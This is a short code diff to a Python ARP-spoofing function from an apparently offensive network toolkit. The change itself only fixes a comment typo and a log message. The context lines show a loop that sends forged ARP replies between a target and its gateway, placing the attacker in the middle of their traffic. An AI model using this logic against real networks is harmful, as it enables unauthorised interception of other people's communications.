@@ -63,10 +63,10 @@ def gpl_arp_spoof_thread(target_IP, gateway_IP, ignore_IP_exists_check=False, pr
             Gateway_MAC = gpl_ip_to_mac(gateway_IP)
             while ARP_SPOOF_RUN:
                 if print_log:
-                    Handler(Error_Levels.Alert, 'Send ArpSpoof between "' + target_IP + '" (' + Target_MAC + ') and "' + gateway_IP + '" (' + Gateway_MAC + ')')
+                    Handler(Error_Levels.Alert, 'Send ArpSpoofs between "' + target_IP + '" (' + Target_MAC + ') and "' + gateway_IP + '" (' + Gateway_MAC + ')')
                 # target -> hacker -> gateway
                 gpl_arp_spoof_fake_once(target_IP, Target_MAC, gateway_IP)
-                # gatewat -> hacker -> target
+                # gateway -> hacker -> target
                 gpl_arp_spoof_fake_once(gateway_IP, Gateway_MAC, target_IP)
                 sleep(ARP_Spoof_Resend_Sleep)
             ARP_SPOOF_RUN = True
